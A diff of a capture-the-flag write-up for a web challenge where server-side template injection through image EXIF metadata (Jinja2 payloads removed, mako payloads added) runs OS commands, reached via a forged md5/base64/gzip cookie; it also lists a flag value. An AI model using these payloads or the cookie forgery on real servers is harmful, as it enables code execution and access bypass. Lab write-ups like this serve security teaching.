@@ -1,36 +1,17 @@
-# CTF Challenge Write-up: SSTI via EXIF Data
+# CTF Challenge: Torcetti al Burro 
+Description
+buona fortuna!!!
 
 ## Challenge Overview
-Web application with image upload functionality vulnerable to Server-Side Template Injection through EXIF metadata processing.
+Web application with image upload functionality vulnerable to Server-Side Template Injection through EXIF metadata processing through admin panel which can be accessed through cookie manipulation.
 
 ## Exploitation Steps
 
-1. **Access Application**
-   - Navigate to http://localhost:5001
-   - Register: username `admin`, password `password123`
-   - Login with credentials
+1. Register as a user and study the cookie which can be decoded in ASCI hex, then base64 and then gzip format. The cookie is now turned into 'username:md5 hash' which the md5 hash is decrypted as 'user'.
+In order to access the admin panel, change the md5 hash as 'admin' and replace it with the original md5 hash then do the encodings in order.
 
-2. **Prepare Malicious Image**
-   ```bash
-   exiftool -Comment='{{config.__class__.__init__.__globals__["os"].popen("cat /home/www/flag.txt").read()}}' image.jpg
-   ```
+2. After accessing the admin panel, you will see an image upload functionality where one can upload an image and then the tool will extract its metadata.
+The Vulnerability lies in the image description part of the exifdata where it uses Server-side template 'mako' which can be injected to view the flag.
+In the exif data editor tool(either online or as a tool in your host machine), inject the SSTI payload "${open("/home/www/flag.txt").read()}" into the image description part of the exifdata.
 
-3. **Upload & Trigger**
-   - Upload the modified image
-   - View uploaded image details
-   - SSTI payload executes in template rendering
-
-4. **Alternative Payloads**
-   ```
-   {{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /home/www/flag.txt').read()}}
-   {{request.application.__globals__.__builtins__.__import__('os').popen('cat /home/www/flag.txt').read()}}
-   ```
-
-## Flag Location
-`/home/www/flag.txt`
-
-## Vulnerability
-Flask template engine processes EXIF Comment field without sanitization, allowing Python code execution.
-
-## Flag Format
-`BCTF{Y0U_C4NNOt_F0o1_Y()uR531F}`
+\\\ To enumerate through command, you can use '${__import__("os").popen("command").read()}' as payload to find the flag or you could just use '${__import__("os").popen("find / -name \"flag.txt\" 2>/dev/null").read()}' to see the location of the flag.
